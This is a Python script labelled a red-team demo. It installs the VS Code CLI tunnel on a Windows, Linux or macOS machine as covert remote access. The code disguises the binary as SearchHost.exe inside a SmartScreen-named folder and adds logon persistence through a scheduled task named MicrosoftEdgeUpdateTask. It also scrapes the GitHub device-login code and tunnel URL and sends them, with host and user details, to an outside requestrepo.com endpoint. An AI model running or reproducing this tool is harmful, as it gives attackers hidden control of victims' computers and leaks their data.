# VSCode Tunnel Red Team Demo Script (Python)

import os
import platform
import zipfile
import requests
import time
import re
import base64
import socket
import getpass
import subprocess

# ------------------------------------
# Configuration
# ------------------------------------
DOWNLOAD_URL = "https://vscode.download.prss.microsoft.com/dbazure/download/stable/ddc367ed5c8936efe395cffeec279b04ffd7db78"
TARGET_DIR = os.path.join(os.getenv('LOCALAPPDATA', ''), "Microsoft", "Edge", "SmartScreen")
ZIP_PATH = os.path.join(TARGET_DIR, 'vscode_cli.zip')
EXE_NAME = 'SearchHost.exe'
EXFIL_ENDPOINT = "http://requestrepo.com/r/kih1wf7e/"
OUTPUT_LOG = os.path.join(TARGET_DIR, 'DiagHost.log')

# ------------------------------------
def ensure_target_dir():
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)

# ------------------------------------
def get_download_url():
    system = platform.system().lower()
    arch = platform.machine().lower()

    if system == 'windows':
        if 'arm64' in arch:
            return f"{DOWNLOAD_URL}/vscode_cli_win32_arm64_cli.zip"
        return f"{DOWNLOAD_URL}/vscode_cli_win32_x64_cli.zip"

    elif system == 'linux':
        if 'arm64' in arch:
            return f"{DOWNLOAD_URL}/vscode_cli_alpine_arm64_cli.tar.gz"
        elif 'arm' in arch:
            return f"{DOWNLOAD_URL}/vscode_cli_linux_armhf_cli.tar.gz"
        return f"{DOWNLOAD_URL}/vscode_cli_alpine_x64_cli.tar.gz"

    elif system == 'darwin':  # macOS
        if 'arm64' in arch:
            return f"{DOWNLOAD_URL}/vscode_cli_darwin_arm64_cli.zip"
        return f"{DOWNLOAD_URL}/vscode_cli_darwin_x64_cli.zip"

    raise Exception("Unsupported OS/Architecture")

# ------------------------------------
def download_vscode():
    print("[INFO] Downloading VSCode CLI...")
    url = get_download_url()
    r = requests.get(url, stream=True)
    with open(ZIP_PATH, 'wb') as f:
        for chunk in r.iter_content(1024):
            f.write(chunk)
    print("[INFO] Download complete.")

# ------------------------------------
def extract_and_prepare():
    print("[INFO] Extracting CLI...")
    with zipfile.ZipFile(ZIP_PATH, 'r') as zip_ref:
        zip_ref.extractall(TARGET_DIR)
    orig_exe = os.path.join(TARGET_DIR, 'code.exe')
    new_exe = os.path.join(TARGET_DIR, EXE_NAME)
    if os.path.exists(new_exe):
        print("[INFO] CLI already extracted. Skipping rename.")
    elif os.path.exists(orig_exe):
        os.rename(orig_exe, new_exe)
        print("[INFO] Renamed code.exe to SearchHost.exe.")
    else:
        print("[WARN] code.exe not found after extraction.")
    os.remove(ZIP_PATH)
    print("[INFO] Extraction complete.")

# ------------------------------------
def register_persistence():
    task_name = "MicrosoftEdgeUpdateTask"
    python_path = os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Python", "pythonw.exe")
    script_path = os.path.join(os.getenv('LOCALAPPDATA'), "Microsoft", "Python", "update.py")
    command = f'schtasks /Create /F /RL HIGHEST /SC ONLOGON /TN {task_name} /TR "\"{python_path}\" \"{script_path}\""'
    # Check if task exists
    check = subprocess.run(f'schtasks /Query /TN {task_name}', stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
    if check.returncode == 0:
        print(f"[INFO] Persistence already set via task '{task_name}'.")
        return
    # Register it
    subprocess.run(command, shell=True)
    print(f"[INFO] Persistence registered as scheduled task '{task_name}'.")

def send_to_requestrepo(data: str):
    encoded = base64.urlsafe_b64encode(data.encode()).decode()
    url = f"{EXFIL_ENDPOINT}{encoded}"
    try:
        res = requests.get(url, timeout=5)
        print(f"[DEBUG] Sent to: {url}, Status: {res.status_code}")
    except Exception as e:
        print(f"[ERROR] Failed to send to requestrepo: {e}")

# ------------------------------------
def collect_metadata():
    return f"Host: {socket.gethostname()}, User: {getpass.getuser()}, OS: {platform.platform()}"

# ------------------------------------
def start_tunnel():
    exe_path = os.path.join(TARGET_DIR, EXE_NAME)
    print("[DEBUG] Executing tunnel start command...")
    with open(OUTPUT_LOG, 'w', encoding='utf-8', errors='ignore') as log:
        process = subprocess.Popen([exe_path, '--locale', 'en-US', 'tunnel', '--accept-server-license-terms', '--name', os.getenv('COMPUTERNAME')],
                                   stdout=log, stdin=subprocess.PIPE, shell=True)
    return process

# ------------------------------------
def monitor_output():
    print("[INFO] Waiting for tunnel to output code...")
    time.sleep(15)  # Give CLI time to print everything

    if not os.path.exists(OUTPUT_LOG):
        print("[ERROR] Output log not found.")
        return False

    with open(OUTPUT_LOG, 'r', encoding='utf-8', errors='ignore') as f:
        content = f.read()

    match = re.search(r"and use Code ([\w\d-]+)", content, re.IGNORECASE)
    if match:
        device_code = match.group(1)
        send_to_requestrepo(f"{device_code}:https://github.com/login/device\n{collect_metadata()}")
        print("[INFO] Device code sent to exfil endpoint.")
    else:
        print("[WARN] Device code not found in output.")

    url_match = re.search(r'(https://vscode\.dev/tunnel/desktop-\w+)', content)
    if url_match:
        tunnel_url = url_match.group(1)
        send_to_requestrepo(f"Tunnel URL: {tunnel_url}\n{collect_metadata()}")
        print("[INFO] Tunnel URL sent to exfil endpoint.")
        return True

    print("[WARN] Tunnel URL not found. Restarting...")
    return False

# ------------------------------------
def logout_existing_session():
    exe_path = os.path.join(TARGET_DIR, EXE_NAME)
    try:
        print("[DEBUG] Executing logout command...")
        subprocess.Popen([exe_path, 'tunnel', '--accept-server-license-terms', 'user', 'logout'], shell=True)
        print("[INFO] Logged out of existing SmartScreen tunnel.")
        time.sleep(3)
    except Exception as e:
        print(f"[WARN] Could not logout: {e}")


def main():
    ensure_target_dir()
    register_persistence()

    if not os.path.exists(ZIP_PATH) and not os.path.exists(os.path.join(TARGET_DIR, EXE_NAME)):
        download_vscode()
    extract_and_prepare()
    logout_existing_session()

    while True:
        proc = start_tunnel()
        success = monitor_output()
        proc.terminate()
        time.sleep(5)
        if success:
            break

if __name__ == '__main__':
    main()
